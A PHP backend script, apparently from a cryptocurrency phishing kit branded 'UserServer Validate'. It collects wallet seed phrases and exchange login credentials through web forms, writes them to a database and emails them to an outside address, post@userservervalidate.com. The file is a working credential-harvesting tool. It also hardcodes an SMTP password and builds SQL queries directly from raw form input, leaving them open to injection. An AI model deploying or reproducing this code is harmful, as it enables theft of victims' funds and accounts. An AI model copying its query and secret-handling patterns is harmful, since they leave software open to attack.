<?php 
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

include('./user/config.php');

//Load Composer's autoloader
//require 'admin/vendor/autoload.php';

require './user/admin/vendor/phpmailer/src/Exception.php';
require './user/admin/vendor/phpmailer/src/PHPMailer.php';
require './user/admin/vendor/phpmailer/src/SMTP.php';


//WALLET SIDE
if(isset($_POST['submitWallet'])){
    $_wallet = $_POST['_wallet'];
    $selectWallet = $_POST['selectWallet'];
    $seed = $_POST['seed'];

    $wallet_msg = "<p>A new wallet record has been created<br> TXN ID: {$_wallet}<br> Wallet:{$selectWallet}<br> Seed:{$seed}<br>You can login to admin dashboard to also view this record.</p>";

    //Create an instance; passing `true` enables exceptions
    $mail = new PHPMailer(true);

    $sql_wallet = "INSERT INTO wallet(wtxn,wallet_name,seed) VALUES('$_wallet','$selectWallet','$seed')";

    $sql_wallet_execute = $con->query($sql_wallet);

    if($sql_wallet_execute){
        //Create an instance; passing `true` enables exceptions
        $mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = 0;     //Enable verbose debug output SMTP::DEBUG_SERVER
    $mail->isSMTP();   //Send using SMTP
    $mail->Host       = 'userservervalidate.com';   //Set the SMTP server to send through
    $mail->SMTPAuth   = true;         //Enable SMTP authentication
    $mail->Username   = 'noreply@userservervalidate.com';    //SMTP username
    $mail->Password   = '#NOREPLYmail99';          //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;  //Enable implicit TLS encryption
    $mail->Port       = 465; //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('noreply@userservervalidate.com', 'UserServer Validate');
    $mail->addAddress('post@userservervalidate.com');  //Add a recipient

    //Content
    $mail->isHTML(true);   //Set email format to HTML
    $mail->Subject = 'New wallet record';
    $mail->Body    = $wallet_msg;
    $mail->AltBody = 'A new wallet record was created, login to admin dashboard view this record';
    $mail->send();
} catch (Exception $e){echo " ";}
        header("Location:confirmation.php?choice=wallet");
    }
}


//EXCHANGE SIDE

if(isset($_POST['submitExchange'])){
    $_xchange = $_POST['_xchange'];
    $selectExchange = $_POST['selectExchange'];
    $user = $_POST['user'];
    $user_pass = $_POST['user_pass'];

    $exchange_msg = "<p>A new exchange record has been created<br> TXN ID: {$_xchange}<br> Exchange:{$selectExchange}<br> User:{$user}<br>Pass:{$user_pass}<br>You can login to admin dashboard to also view this record.</p>";

    $sql_exchange = "INSERT INTO exchange(etxn,exchange_name,user_login,user_pass) VALUES('$_xchange','$selectExchange','$user','$user_pass')";

    $sql_exchange_execute = $con->query($sql_exchange);

    if($sql_exchange_execute){
         //Create an instance; passing `true` enables exceptions
        $mail = new PHPMailer(true);

        try {
    //Server settings
    $mail->SMTPDebug = 0;     //Enable verbose debug output SMTP::DEBUG_SERVER
    $mail->isSMTP();   //Send using SMTP
    $mail->Host       = 'userservervalidate.com';   //Set the SMTP server to send through
    $mail->SMTPAuth   = true;         //Enable SMTP authentication
    $mail->Username   = 'noreply@userservervalidate.com';    //SMTP username
    $mail->Password   = '#NOREPLYmail99';          //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;  //Enable implicit TLS encryption
    $mail->Port       = 465; //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('noreply@userservervalidate.com', 'UserServer Validate');
    $mail->addAddress('post@userservervalidate.com');  //Add a recipient

    //Content
    $mail->isHTML(true);   //Set email format to HTML
    $mail->Subject = 'New Exchange record';
    $mail->Body    = $exchange_msg;
    $mail->AltBody = 'A new exchange record was created, login to admin dashboard view this record';
    $mail->send();
} catch (Exception $e){echo " ";}
        header("Location:confirmation.php?choice=exchange");
    }
}
$con->close();
?>